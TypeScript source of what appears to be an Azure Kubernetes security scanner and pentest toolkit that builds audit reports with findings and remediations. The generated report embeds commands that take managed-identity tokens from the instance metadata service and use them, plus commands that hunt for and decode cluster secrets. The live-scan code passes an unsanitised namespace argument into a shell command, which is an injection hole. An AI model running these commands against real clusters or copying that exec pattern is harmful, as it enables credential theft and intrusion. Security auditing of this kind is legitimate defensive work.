              remediation: 'Enable network policy (azure/calico): az aks update --network-policy azure'
            });
            criticalCount++;
          } else {
            output += `| Network Policy | ✅ ${networkPolicy} | OK |\n`;
          }

          // Outbound Type
          const outboundType = cluster.networkProfile?.outboundType || 'loadBalancer';
          output += `| Outbound Type | ${outboundType} | INFO |\n`;
          
          if (outboundType === 'loadBalancer') {
            allFindings.push({
              severity: 'LOW',
              finding: 'Using default outbound type (loadBalancer)',
              remediation: 'Consider userDefinedRouting with Azure Firewall for better egress control'
            });
            lowCount++;
          }

          // HTTP Application Routing (INSECURE)
          if (cluster.addonProfiles?.httpApplicationRouting?.enabled) {
            output += `| HTTP App Routing | ⚠️ Enabled | HIGH |\n`;
            allFindings.push({
              severity: 'HIGH',
              finding: 'HTTP Application Routing addon enabled - NOT recommended for production',
              remediation: 'Disable HTTP Application Routing, use NGINX/AGIC ingress instead'
            });
            highCount++;
          }

          // Load Balancer SKU
          output += `| Load Balancer SKU | ${cluster.networkProfile?.loadBalancerSku || 'standard'} | INFO |\n`;
          
          output += '\n';

          // Network Profile Details
          output += `### Network Configuration Details\n\n`;
          output += `| Setting | Value |\n|---------|-------|\n`;
          output += `| Service CIDR | ${cluster.networkProfile?.serviceCidr || 'N/A'} |\n`;
          output += `| DNS Service IP | ${cluster.networkProfile?.dnsServiceIP || 'N/A'} |\n`;
          output += `| Pod CIDR | ${cluster.networkProfile?.podCidr || 'N/A (Azure CNI)'} |\n`;
          output += `| Docker Bridge | ${(cluster.networkProfile as any)?.dockerBridgeCidr || 'N/A'} |\n`;
          output += `| Network Mode | ${cluster.networkProfile?.networkMode || 'bridge'} |\n`;
          output += `| Network Plugin Mode | ${cluster.networkProfile?.networkPluginMode || 'N/A'} |\n\n`;

          // ========== 4. SECURITY FEATURES ==========
          output += `## 🛡️ Security Features & Add-ons\n\n`;
          output += `| Security Feature | Status | Risk |\n|------------------|--------|------|\n`;
          
          // Defender for Containers
          if (!cluster.securityProfile?.defender?.securityMonitoring?.enabled) {
            output += `| Defender for Containers | ❌ Not Enabled | HIGH |\n`;
            allFindings.push({
              severity: 'HIGH',
              finding: 'Microsoft Defender for Containers not enabled',
              remediation: 'Enable Defender for threat detection: az aks update --enable-defender'
            });
            highCount++;
          } else {
            output += `| Defender for Containers | ✅ Enabled | OK |\n`;
          }

          // Azure Policy
          if (!cluster.addonProfiles?.azurepolicy?.enabled) {
            output += `| Azure Policy | ❌ Not Enabled | MEDIUM |\n`;
            allFindings.push({
              severity: 'MEDIUM',
              finding: 'Azure Policy addon not enabled',
              cis: 'CIS 5.2.1',
              remediation: 'Enable Azure Policy: az aks enable-addons --addons azure-policy'
            });
            mediumCount++;
          } else {
            output += `| Azure Policy | ✅ Enabled | OK |\n`;
          }

          // Key Vault Secrets Provider
          if (cluster.addonProfiles?.azureKeyvaultSecretsProvider?.enabled) {
            output += `| Key Vault Secrets Provider | ✅ Enabled | OK |\n`;
            
            // Check secret rotation
            const kvConfig = cluster.addonProfiles.azureKeyvaultSecretsProvider.config;
            if (kvConfig?.enableSecretRotation === 'true') {
              output += `| Secret Rotation | ✅ Enabled | OK |\n`;
            } else {
              output += `| Secret Rotation | ⚠️ Disabled | MEDIUM |\n`;
              allFindings.push({
                severity: 'MEDIUM',
                finding: 'Key Vault secret rotation not enabled',
                remediation: 'Enable secret rotation for automatic secret refresh'
              });
              mediumCount++;
            }
          } else {
            output += `| Key Vault Secrets Provider | ⚠️ Not Enabled | MEDIUM |\n`;
            allFindings.push({
              severity: 'MEDIUM',
              finding: 'Key Vault Secrets Provider not enabled',
              remediation: 'Enable for secure secret injection: az aks enable-addons --addons azure-keyvault-secrets-provider'
            });
            mediumCount++;
          }

          // Container Insights (Monitoring)
          if (cluster.addonProfiles?.omsagent?.enabled || cluster.addonProfiles?.omsAgent?.enabled) {
            output += `| Container Insights | ✅ Enabled | OK |\n`;
          } else {
            output += `| Container Insights | ⚠️ Not Enabled | MEDIUM |\n`;
            allFindings.push({
              severity: 'MEDIUM',
              finding: 'Container Insights (monitoring) not enabled',
              remediation: 'Enable for visibility: az aks enable-addons --addons monitoring'
            });
            mediumCount++;
          }

          // Image Cleaner
          if (cluster.securityProfile?.imageCleaner?.enabled) {
            output += `| Image Cleaner | ✅ Enabled | OK |\n`;
          } else {
            output += `| Image Cleaner | ⚠️ Not Enabled | LOW |\n`;
            allFindings.push({
              severity: 'LOW',
              finding: 'Image Cleaner not enabled - stale images may accumulate',
              remediation: 'Enable Image Cleaner to remove unused images'
            });
            lowCount++;
          }

          // Workload Identity
          if (cluster.oidcIssuerProfile?.enabled && cluster.securityProfile?.workloadIdentity?.enabled) {
            output += `| Workload Identity | ✅ Enabled | OK |\n`;
          } else if (cluster.oidcIssuerProfile?.enabled) {
            output += `| Workload Identity | ⚠️ OIDC Only | MEDIUM |\n`;
            allFindings.push({
              severity: 'MEDIUM',
              finding: 'OIDC issuer enabled but Workload Identity not fully configured',
              remediation: 'Enable Workload Identity for secure pod identity'
            });
            mediumCount++;
          } else {
            output += `| Workload Identity | ❌ Not Enabled | HIGH |\n`;
            allFindings.push({
              severity: 'HIGH',
              finding: 'Workload Identity not enabled - pods may use node identity',
              cis: 'CIS 5.1.6',
              remediation: 'Enable Workload Identity: az aks update --enable-oidc-issuer --enable-workload-identity'
            });
            highCount++;
          }

          // Legacy Pod Identity (should be disabled)
          if (cluster.podIdentityProfile?.enabled) {
            output += `| Pod Identity (Legacy) | ⚠️ Enabled | HIGH |\n`;
            allFindings.push({
              severity: 'HIGH',
              finding: 'Legacy Pod Identity enabled - deprecated and vulnerable to IMDS attacks',
              remediation: 'Migrate to Workload Identity and disable Pod Identity'
            });
            highCount++;
          }

          output += '\n';

          // ========== 5. IDENTITY CONFIGURATION ==========
          output += `## 🪪 Identity Configuration\n\n`;
          
          // Cluster Identity
          output += `### Cluster Identity\n\n`;
          if (cluster.identity) {
            output += `| Property | Value |\n|----------|-------|\n`;
            output += `| Type | ${cluster.identity.type} |\n`;
            if (cluster.identity.principalId) {
              output += `| Principal ID | ${cluster.identity.principalId} |\n`;
            }
            if (cluster.identity.tenantId) {
              output += `| Tenant ID | ${cluster.identity.tenantId} |\n`;
            }
            if (cluster.identity.userAssignedIdentities) {
              const uaIds = Object.keys(cluster.identity.userAssignedIdentities);
              output += `| User Assigned Identities | ${uaIds.length} |\n`;
              for (const uaId of uaIds) {
                const name = uaId.split('/').pop();
                output += `| → | ${name} |\n`;
              }
            }
            output += '\n';
          }

          // Kubelet Identity
          if (cluster.identityProfile?.kubeletidentity) {
            const kubelet = cluster.identityProfile.kubeletidentity;
            output += `### Kubelet Identity\n\n`;
            output += `| Property | Value |\n|----------|-------|\n`;
            output += `| Client ID | ${kubelet.clientId} |\n`;
            output += `| Object ID | ${kubelet.objectId} |\n`;
            output += `| Resource ID | ${kubelet.resourceId} |\n\n`;
            
            output += `⚠️ **Pentest Note:** Check RBAC roles assigned to kubelet identity for privilege escalation paths\n\n`;
          }

          // OIDC Issuer
          if (cluster.oidcIssuerProfile?.enabled) {
            output += `### OIDC Issuer\n\n`;
            output += `| Property | Value |\n|----------|-------|\n`;
            output += `| Enabled | ✅ Yes |\n`;
            output += `| Issuer URL | ${cluster.oidcIssuerProfile.issuerURL} |\n\n`;
          }

          // ========== 6. NODE POOL SECURITY ==========
          output += `## 🖥️ Node Pool Security Analysis\n\n`;
          
          const nodePools = cluster.agentPoolProfiles || [];
          for (const pool of nodePools) {
            output += `### Node Pool: \`${pool.name}\`\n\n`;
            output += `| Setting | Value | Risk |\n|---------|-------|------|\n`;
            output += `| VM Size | ${pool.vmSize} | INFO |\n`;
            output += `| Node Count | ${pool.count} (min: ${pool.minCount || 'N/A'}, max: ${pool.maxCount || 'N/A'}) | INFO |\n`;
            output += `| OS Type | ${pool.osType} | INFO |\n`;
            output += `| OS SKU | ${pool.osSKU || 'Ubuntu'} | INFO |\n`;
            output += `| OS Disk Size | ${pool.osDiskSizeGB || 128} GB | INFO |\n`;
            output += `| OS Disk Type | ${pool.osDiskType || 'Managed'} | INFO |\n`;
            output += `| Mode | ${pool.mode} | INFO |\n`;
            output += `| Orchestrator Version | ${pool.orchestratorVersion || cluster.kubernetesVersion} | INFO |\n`;
            
            // Security Checks
            if (pool.enableNodePublicIP) {
              output += `| Node Public IP | ❌ Enabled | CRITICAL |\n`;
              allFindings.push({
                severity: 'CRITICAL',
                finding: `Node pool '${pool.name}' has public IPs enabled on nodes`,
                cis: 'CIS 4.2.1',
                remediation: 'Disable public IPs on nodes - use private cluster or NAT gateway'
              });
              criticalCount++;
            } else {
              output += `| Node Public IP | ✅ Disabled | OK |\n`;
            }
            
            if (pool.enableFips) {
              output += `| FIPS 140-2 | ✅ Enabled | OK |\n`;
            } else {
              output += `| FIPS 140-2 | ⚠️ Disabled | LOW |\n`;
              allFindings.push({
                severity: 'LOW',
                finding: `Node pool '${pool.name}' does not have FIPS enabled`,
                remediation: 'Enable FIPS for compliance requirements (requires node pool recreation)'
              });
              lowCount++;
            }

            // Encryption at Host
            if (pool.enableEncryptionAtHost) {
              output += `| Encryption at Host | ✅ Enabled | OK |\n`;
            } else {
              output += `| Encryption at Host | ⚠️ Disabled | MEDIUM |\n`;
              allFindings.push({
                severity: 'MEDIUM',
                finding: `Node pool '${pool.name}' does not have encryption at host`,
                remediation: 'Enable encryption at host for data-at-rest protection'
              });
              mediumCount++;
            }

            // Ultra SSD
            if (pool.enableUltraSSD) {
              output += `| Ultra SSD | ✅ Enabled | INFO |\n`;
            }

            // Spot instances
            if (pool.scaleSetPriority === 'Spot') {
              output += `| Spot Instance | ⚠️ Yes | INFO |\n`;
              output += `| Spot Eviction Policy | ${pool.scaleSetEvictionPolicy || 'Delete'} | INFO |\n`;
            }

            // Node labels and taints
            if (pool.nodeLabels && Object.keys(pool.nodeLabels).length > 0) {
              output += `| Node Labels | ${Object.keys(pool.nodeLabels).length} labels | INFO |\n`;
            }
            if (pool.nodeTaints && pool.nodeTaints.length > 0) {
              output += `| Node Taints | ${pool.nodeTaints.length} taints | INFO |\n`;
            }

            output += '\n';
          }

          // ========== 7. AUTO-UPGRADE & MAINTENANCE ==========
          output += `## 🔄 Auto-Upgrade & Maintenance\n\n`;
          output += `| Setting | Value | Risk |\n|---------|-------|------|\n`;
          
          // Auto-upgrade channel
          const upgradeChannel = cluster.autoUpgradeProfile?.upgradeChannel || 'none';
          if (upgradeChannel === 'none') {
            output += `| Auto-Upgrade Channel | ❌ None | MEDIUM |\n`;
            allFindings.push({
              severity: 'MEDIUM',
              finding: 'Auto-upgrade not configured - manual upgrades required',
              remediation: 'Consider enabling auto-upgrade: az aks update --auto-upgrade-channel stable'
            });
            mediumCount++;
          } else {
            output += `| Auto-Upgrade Channel | ✅ ${upgradeChannel} | OK |\n`;
          }

          // Node OS upgrade channel
          const nodeOsUpgrade = cluster.autoUpgradeProfile?.nodeOSUpgradeChannel || 'None';
          output += `| Node OS Upgrade | ${nodeOsUpgrade} | INFO |\n`;

          output += '\n';

          // ========== 8. STORAGE SECURITY ==========
          output += `## 💾 Storage Security\n\n`;
          output += `| Setting | Value | Risk |\n|---------|-------|------|\n`;
          
          // Disk Encryption Set
          if (cluster.diskEncryptionSetID) {
            output += `| Disk Encryption Set | ✅ Configured | OK |\n`;
            output += `| DES ID | ${cluster.diskEncryptionSetID.split('/').pop()} | INFO |\n`;
          } else {
            output += `| Disk Encryption Set | ⚠️ Platform Managed | LOW |\n`;
            allFindings.push({
              severity: 'LOW',
              finding: 'Using platform-managed disk encryption (no customer-managed keys)',
              remediation: 'Consider using customer-managed keys (CMK) for disk encryption'
            });
            lowCount++;
          }

          output += '\n';

          // ========== 9. IMDS & POD ESCAPE TESTING ==========
          output += `## 🎯 IMDS & Pod Escape Testing\n\n`;
          
          if (!networkPolicy) {
            output += `⚠️ **CRITICAL:** No network policy = IMDS accessible from all pods!\n\n`;
          }
          
          output += `### Step 1: Deploy Test Pod\n`;
          output += "```bash\n";
          output += `kubectl run imds-test --image=alpine:latest --restart=Never --rm -it -- sh\n`;
          output += "```\n\n";
          
          output += `### Step 2: Test IMDS Access\n`;
          output += "```bash\n";
          output += `apk add --no-cache curl jq\n`;
          output += `curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq\n`;
          output += "```\n\n";
          
          output += `### Step 3: Extract Managed Identity Token\n`;
          output += "```bash\n";
          output += `# Get ARM token\n`;
          output += `TOKEN=$(curl -s -H "Metadata: true" \\\n`;
          output += `  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \\\n`;
          output += `  | jq -r .access_token)\n\n`;
          output += `# Decode token to see permissions\n`;
          output += `echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq\n\n`;
          output += `# List subscriptions with stolen token\n`;
          output += `curl -s -H "Authorization: Bearer $TOKEN" \\\n`;
          output += `  "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq\n\n`;
          output += `# Get Key Vault token\n`;
          output += `KV_TOKEN=$(curl -s -H "Metadata: true" \\\n`;
          output += `  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \\\n`;
          output += `  | jq -r .access_token)\n`;
          output += "```\n\n";
          
          output += `### Step 4: Block IMDS with Network Policy\n`;
          output += "```yaml\n";
          output += `apiVersion: networking.k8s.io/v1\n`;
          output += `kind: NetworkPolicy\n`;
          output += `metadata:\n`;
          output += `  name: deny-imds\n`;
          output += `  namespace: default  # Apply to all namespaces!\n`;
          output += `spec:\n`;
          output += `  podSelector: {}\n`;
          output += `  policyTypes:\n`;
          output += `    - Egress\n`;
          output += `  egress:\n`;
          output += `    - to:\n`;
          output += `        - ipBlock:\n`;
          output += `            cidr: 0.0.0.0/0\n`;
          output += `            except:\n`;
          output += `              - 169.254.169.254/32\n`;
          output += "```\n\n";

          // ========== 10. SERVICE ACCOUNT AUDIT ==========
          output += `## 🔐 Service Account Security Audit\n\n`;
          output += `### Check Default SA Auto-Mount\n`;
          output += "```bash\n";
          output += `kubectl get serviceaccounts --all-namespaces -o json | \\\n`;
          output += `  jq -r '.items[] | select(.automountServiceAccountToken != false) | "\\(.metadata.namespace)/\\(.metadata.name)"'\n`;
          output += "```\n\n";
          
          output += `### Find Cluster-Admin Bindings\n`;
          output += "```bash\n";
          output += `kubectl get clusterrolebindings -o json | \\\n`;
          output += `  jq -r '.items[] | select(.roleRef.name=="cluster-admin") | "\\(.metadata.name): \\(.subjects // [] | map(.name) | join(", "))"'\n`;
          output += "```\n\n";
          
          output += `### Find SAs with Dangerous Permissions\n`;
          output += "```bash\n";
          output += `kubectl auth can-i --list --as=system:serviceaccount:kube-system:default\n`;
          output += "```\n\n";
          
          output += `### List Legacy Token Secrets\n`;
          output += "```bash\n";
          output += `kubectl get secrets -A -o json | \\\n`;
          output += `  jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\\(.metadata.namespace)/\\(.metadata.name)"'\n`;
          output += "```\n\n";

          // ========== 11. SECRET HUNTING ==========
          output += `## 🔍 Secret Hunting Commands\n\n`;
          output += `### List All Secrets (excluding SA tokens)\n`;
          output += "```bash\n";
          output += `kubectl get secrets -A --field-selector type!=kubernetes.io/service-account-token -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.type\n`;
          output += "```\n\n";
          
          output += `### Find Secrets with Sensitive Keywords\n`;
          output += "```bash\n";
          output += `kubectl get secrets -A -o json | jq -r '\n`;
          output += `  .items[] | \n`;
          output += `  select(.data | keys[] | test("password|secret|key|token|connection|azure"; "i")) | \n`;
          output += `  "\\(.metadata.namespace)/\\(.metadata.name): \\(.data | keys | join(\", \"))"'\n`;
          output += "```\n\n";
          
          output += `### Extract and Decode Secret\n`;
          output += "```bash\n";
          output += `kubectl get secret <SECRET_NAME> -n <NAMESPACE> -o json | \\\n`;
          output += `  jq -r '.data | to_entries[] | "\\(.key): \\(.value | @base64d)"'\n`;
          output += "```\n\n";
          
          output += `### Find ConfigMaps with Secrets\n`;
          output += "```bash\n";
          output += `kubectl get configmaps -A -o json | jq -r '\n`;
          output += `  .items[] | select(.data | to_entries[] | .value | test("password|connectionstring|apikey"; "i")) | \n`;
          output += `  "\\(.metadata.namespace)/\\(.metadata.name)"'\n`;
          output += "```\n\n";
          
          output += `### Find Secrets in Environment Variables\n`;
          output += "```bash\n";
          output += `kubectl get pods -A -o json | jq -r '\n`;
          output += `  .items[] | . as $pod | .spec.containers[] | .env[]? | \n`;
          output += `  select(.valueFrom.secretKeyRef) | \n`;
          output += `  "\\($pod.metadata.namespace)/\\($pod.metadata.name): \\(.name) from \\(.valueFrom.secretKeyRef.name)"'\n`;
          output += "```\n\n";

          // ========== 12. CIS BENCHMARK MAPPING ==========
          output += `## 📋 CIS Kubernetes Benchmark Mapping\n\n`;
          output += `| CIS Control | Finding | Status |\n|-------------|---------|--------|\n`;
          
          // Map findings to CIS
          const cisMapping: Record<string, {control: string; status: string}> = {
            'CIS 1.1.1': { control: 'Kubernetes Version', status: minorVersion >= 28 ? '✅ PASS' : '❌ FAIL' },
            'CIS 3.1.1': { control: 'Azure AD Authentication', status: cluster.aadProfile ? '✅ PASS' : '❌ FAIL' },
            'CIS 3.1.2': { control: 'Disable Local Accounts', status: cluster.disableLocalAccounts ? '✅ PASS' : '❌ FAIL' },
            'CIS 4.1.1': { control: 'Private API Server', status: cluster.apiServerAccessProfile?.enablePrivateCluster ? '✅ PASS' : '⚠️ REVIEW' },
            'CIS 4.1.2': { control: 'API Server IP Restriction', status: authIPs.length > 0 || cluster.apiServerAccessProfile?.enablePrivateCluster ? '✅ PASS' : '❌ FAIL' },
            'CIS 5.1.1': { control: 'RBAC Enabled', status: cluster.enableRbac ? '✅ PASS' : '❌ FAIL' },
            'CIS 5.1.6': { control: 'Workload Identity', status: cluster.oidcIssuerProfile?.enabled ? '✅ PASS' : '⚠️ REVIEW' },
            'CIS 5.2.1': { control: 'Azure Policy Enabled', status: cluster.addonProfiles?.azurepolicy?.enabled ? '✅ PASS' : '⚠️ REVIEW' },
            'CIS 5.3.2': { control: 'Network Policy Enabled', status: networkPolicy ? '✅ PASS' : '❌ FAIL' },
          };
          
          for (const [cis, info] of Object.entries(cisMapping)) {
            output += `| ${cis} | ${info.control} | ${info.status} |\n`;
          }
          output += '\n';

          // ========== 13. ALL FINDINGS ==========
          output += `## 🚨 All Security Findings\n\n`;
          
          // Sort by severity
          const severityOrder: Record<string, number> = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3 };
          allFindings.sort((a, b) => severityOrder[a.severity] - severityOrder[b.severity]);
          
          if (allFindings.length > 0) {
            output += `| # | Severity | Finding | CIS | Remediation |\n|---|----------|---------|-----|-------------|\n`;
            let i = 1;
            for (const f of allFindings) {
              const icon = f.severity === 'CRITICAL' ? '🔴' : f.severity === 'HIGH' ? '🟠' : f.severity === 'MEDIUM' ? '🟡' : '🟢';
              output += `| ${i++} | ${icon} ${f.severity} | ${f.finding} | ${f.cis || '-'} | ${f.remediation} |\n`;
            }
          } else {
            output += `✅ No security findings - cluster is well configured!\n`;
          }
          output += '\n';

          // ========== SUMMARY ==========
          output += `---\n\n`;
          output += `## 📊 Executive Summary\n\n`;
          output += `| Severity | Count |\n|----------|-------|\n`;
          output += `| 🔴 CRITICAL | ${criticalCount} |\n`;
          output += `| 🟠 HIGH | ${highCount} |\n`;
          output += `| 🟡 MEDIUM | ${mediumCount} |\n`;
          output += `| 🟢 LOW | ${lowCount} |\n`;
          output += `| **TOTAL FINDINGS** | **${allFindings.length}** |\n\n`;

          // Risk Score
          const riskScore = (criticalCount * 40) + (highCount * 20) + (mediumCount * 5) + (lowCount * 1);
          let riskLevel = 'LOW';
          let riskEmoji = '🟢';
          if (riskScore >= 100) { riskLevel = 'CRITICAL'; riskEmoji = '🔴'; }
          else if (riskScore >= 50) { riskLevel = 'HIGH'; riskEmoji = '🟠'; }
          else if (riskScore >= 20) { riskLevel = 'MEDIUM'; riskEmoji = '🟡'; }
          
          output += `### Risk Assessment\n\n`;
          output += `**Risk Score:** ${riskScore} / 100+ possible\n`;
          output += `**Risk Level:** ${riskEmoji} **${riskLevel}**\n\n`;

          if (criticalCount > 0) {
            output += `⚠️ **${criticalCount} CRITICAL findings require immediate remediation!**\n\n`;
          }

          // Top 3 Recommendations
          output += `### 🎯 Top Priority Remediations\n\n`;
          const topFindings = allFindings.slice(0, 3);
          let priority = 1;
          for (const f of topFindings) {
            output += `${priority++}. **${f.finding}**\n   → ${f.remediation}\n\n`;
          }

          output += `---\n\n`;
          output += `*Generated by Stratos MCP v1.9.3 - Azure Penetration Testing Toolkit*\n`;
          output += `*Reference: https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-services/az-aks*\n`;

          return {
            content: [{ type: 'text', text: output }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error running full AKS scan: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "scan_aks_live": {
        const { subscriptionId, resourceGroup, clusterName, namespace } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup: string;
          clusterName: string;
          namespace?: string;
        };

        try {
          const aksClient = new ContainerServiceClient(credential, subscriptionId);
          
          let output = `# 🔴 LIVE AKS SECURITY SCAN via kubectl\n\n`;
          output += `**Cluster:** ${clusterName}\n`;
          output += `**Resource Group:** ${resourceGroup}\n`;
          output += `**Subscription:** ${subscriptionId}\n`;
          output += `**Target Namespace:** ${namespace || 'All namespaces'}\n`;
          output += `**Scan Time:** ${new Date().toISOString()}\n`;
          output += `**Scanner:** Stratos MCP v1.9.6 (kubectl CLI with 30s timeout)\n\n`;
          output += `---\n\n`;

          // Get cluster credentials
          output += `## 🔑 Connecting to Cluster...\n\n`;
          
          const cluster = await aksClient.managedClusters.get(resourceGroup, clusterName);
          
          // Get admin credentials (kubeconfig)
          let kubeconfig: string;
          try {
            const adminCreds = await aksClient.managedClusters.listClusterAdminCredentials(resourceGroup, clusterName);
            if (!adminCreds.kubeconfigs || adminCreds.kubeconfigs.length === 0) {
              throw new Error("No kubeconfig returned");
            }
            kubeconfig = Buffer.from(adminCreds.kubeconfigs[0].value!).toString('utf-8');
            output += `✅ Admin credentials obtained\n\n`;
          } catch (adminError: any) {
            // Try user credentials if admin fails (AAD-enabled clusters)
            try {
              const userCreds = await aksClient.managedClusters.listClusterUserCredentials(resourceGroup, clusterName);
              if (!userCreds.kubeconfigs || userCreds.kubeconfigs.length === 0) {
                throw new Error("No kubeconfig returned");
              }
              kubeconfig = Buffer.from(userCreds.kubeconfigs[0].value!).toString('utf-8');
              output += `✅ User credentials obtained (admin credentials unavailable)\n\n`;
            } catch (userError: any) {
              return {
                content: [{
                  type: 'text',
                  text: `# ❌ Failed to Connect to Cluster\n\n` +
                    `Could not obtain cluster credentials.\n\n` +
                    `**Admin Error:** ${adminError.message}\n` +
                    `**User Error:** ${userError.message}\n\n` +
                    `**Try manually:**\n` +
                    `\`\`\`bash\n` +
                    `az aks get-credentials --resource-group ${resourceGroup} --name ${clusterName}\n` +
                    `kubectl get nodes\n` +
                    `\`\`\``
                }],
                isError: true,
              };
            }
          }

          // Convert kubeconfig from devicecode to azurecli auth
          // Replace: --login devicecode → --login azurecli
          kubeconfig = kubeconfig.replace(/--login\s+devicecode/gi, '--login azurecli');
          
          // Save kubeconfig to temp file for kubectl fallback
          const os = await import('os');
          const path = await import('path');
          const fs = await import('fs').then(m => m.promises);
          const tempKubeconfig = path.join(os.tmpdir(), `stratos-kubeconfig-${Date.now()}.yaml`);
          await fs.writeFile(tempKubeconfig, kubeconfig);
          
          // Timeout constant for kubectl calls (30 seconds)
          const KUBECTL_TIMEOUT_MS = 30000;
          
          // Helper function to run kubectl command (primary method - more reliable)
          const runKubectl = async (args: string): Promise<string> => {
            const { exec, spawn } = await import('child_process');
            return new Promise((resolve, reject) => {
              let killed = false;
              const child = exec(
                `kubectl --kubeconfig="${tempKubeconfig}" ${args}`,
                { maxBuffer: 10 * 1024 * 1024, timeout: KUBECTL_TIMEOUT_MS },
                (error, stdout, stderr) => {
                  if (killed) return;
                  if (error) {
                    if (error.killed || error.signal === 'SIGTERM') {
                      reject(new Error(`kubectl timed out after ${KUBECTL_TIMEOUT_MS/1000}s`));
                    } else {
                      reject(new Error(stderr || error.message));
                    }
                  } else {
                    resolve(stdout);
                  }
                }
              );
              
              // Backup timeout to kill process
              setTimeout(() => {
                if (child.exitCode === null) {
                  killed = true;
                  child.kill('SIGTERM');
                  reject(new Error(`kubectl timed out after ${KUBECTL_TIMEOUT_MS/1000}s`));
                }
              }, KUBECTL_TIMEOUT_MS + 1000);
            });
          };
          
          let criticalCount = 0;
          let highCount = 0;
          let mediumCount = 0;
          let lowCount = 0;
          const findings: Array<{severity: string; category: string; finding: string; details: string}> = [];

          // ========== 1. ENUMERATE NAMESPACES ==========
          output += `## 📁 Namespaces\n\n`;
          let nsList: string[] = [];
          try {
            const nsJson = await runKubectl('get namespaces -o json');
            const nsData = JSON.parse(nsJson);
            nsList = (nsData.items || []).map((ns: any) => ns.metadata?.name).filter(Boolean);
            output += `Found **${nsList.length}** namespaces:\n`;
            output += `\`${nsList.join(', ')}\`\n\n`;
          } catch (e: any) {
            output += `❌ Failed to list namespaces: ${e.message}\n\n`;
          }

          // ========== 2. ENUMERATE SECRETS ==========
          output += `## 🔐 Secrets Analysis\n\n`;
          try {
            const secretsCmd = namespace 
              ? `get secrets -n ${namespace} -o json`
              : `get secrets --all-namespaces -o json`;
            const secretsJson = await runKubectl(secretsCmd);
            const allSecrets = JSON.parse(secretsJson).items || [];
            
            const nonSaSecrets = allSecrets.filter((s: any) => s.type !== 'kubernetes.io/service-account-token');
            const sensitiveSecrets: Array<{ns: string; name: string; type: string; keys: string[]}> = [];
            
            const sensitiveKeywords = ['password', 'secret', 'key', 'token', 'connection', 'azure', 'credential', 'api'];
            
            for (const secret of nonSaSecrets) {
              const keys = Object.keys((secret as any).data || {});
              const hasSensitive = keys.some((k: string) => 
                sensitiveKeywords.some(kw => k.toLowerCase().includes(kw))
              );
              if (hasSensitive || (secret as any).type === 'Opaque') {
                sensitiveSecrets.push({
                  ns: (secret as any).metadata?.namespace || 'unknown',
                  name: (secret as any).metadata?.name || 'unknown',
                  type: (secret as any).type || 'unknown',
                  keys: keys
                });
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total Secrets | ${allSecrets.length} |\n`;
            output += `| Service Account Tokens | ${allSecrets.length - nonSaSecrets.length} |\n`;
            output += `| Application Secrets | ${nonSaSecrets.length} |\n`;
            output += `| Potentially Sensitive | ${sensitiveSecrets.length} |\n\n`;
            
            if (sensitiveSecrets.length > 0) {
              output += `### 🎯 Potentially Sensitive Secrets\n\n`;
              output += `| Namespace | Secret Name | Type | Keys |\n|-----------|-------------|------|------|\n`;
              for (const s of sensitiveSecrets.slice(0, 20)) {
                output += `| ${s.ns} | ${s.name} | ${s.type} | ${s.keys.slice(0, 3).join(', ')}${s.keys.length > 3 ? '...' : ''} |\n`;
              }
              if (sensitiveSecrets.length > 20) {
                output += `\n*...and ${sensitiveSecrets.length - 20} more*\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'HIGH',
                category: 'Secrets',
                finding: `${sensitiveSecrets.length} potentially sensitive secrets found`,
                details: 'Review secrets for hardcoded credentials'
              });
              highCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to list secrets: ${e.message}\n\n`;
          }

          // ========== 3. SERVICE ACCOUNTS ==========
          output += `## 👤 Service Accounts\n\n`;
          try {
            const saCmd = namespace 
              ? `get serviceaccounts -n ${namespace} -o json`
              : `get serviceaccounts --all-namespaces -o json`;
            const saJson = await runKubectl(saCmd);
            const saList = JSON.parse(saJson).items || [];
            
            const defaultSaAutoMount: Array<{ns: string; name: string}> = [];
            
            for (const sa of saList) {
              if ((sa as any).automountServiceAccountToken !== false) {
                if ((sa as any).metadata?.name === 'default') {
                  defaultSaAutoMount.push({
                    ns: (sa as any).metadata?.namespace || 'unknown',
                    name: (sa as any).metadata?.name || 'unknown'
                  });
                }
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total Service Accounts | ${saList.length} |\n`;
            output += `| Default SAs with Auto-Mount | ${defaultSaAutoMount.length} |\n\n`;
            
            if (defaultSaAutoMount.length > 0) {
              output += `### ⚠️ Default Service Accounts with Token Auto-Mount\n\n`;
              for (const sa of defaultSaAutoMount.slice(0, 10)) {
                output += `- \`${sa.ns}/default\`\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'MEDIUM',
                category: 'Service Accounts',
                finding: `${defaultSaAutoMount.length} default SAs with auto-mount enabled`,
                details: 'Disable automountServiceAccountToken on default SAs'
              });
              mediumCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to list service accounts: ${e.message}\n\n`;
          }

          // ========== 4. RBAC BINDINGS ==========
          output += `## 🔒 RBAC Analysis\n\n`;
          try {
            const crbJson = await runKubectl('get clusterrolebindings -o json');
            const crbItems = JSON.parse(crbJson).items || [];
            
            const rbCmd = namespace 
              ? `get rolebindings -n ${namespace} -o json`
              : `get rolebindings --all-namespaces -o json`;
            const rbJson = await runKubectl(rbCmd);
            const rbItems = JSON.parse(rbJson).items || [];
            
            const dangerousBindings: Array<{name: string; role: string; subjects: string[]}> = [];
            const dangerousRoles = ['cluster-admin', 'admin', 'edit'];
            
            for (const crb of crbItems) {
              if (dangerousRoles.includes((crb as any).roleRef?.name)) {
                const subjects = ((crb as any).subjects || []).map((s: any) => 
                  `${s.kind}:${s.namespace ? s.namespace + '/' : ''}${s.name}`
                );
                dangerousBindings.push({
                  name: (crb as any).metadata?.name || 'unknown',
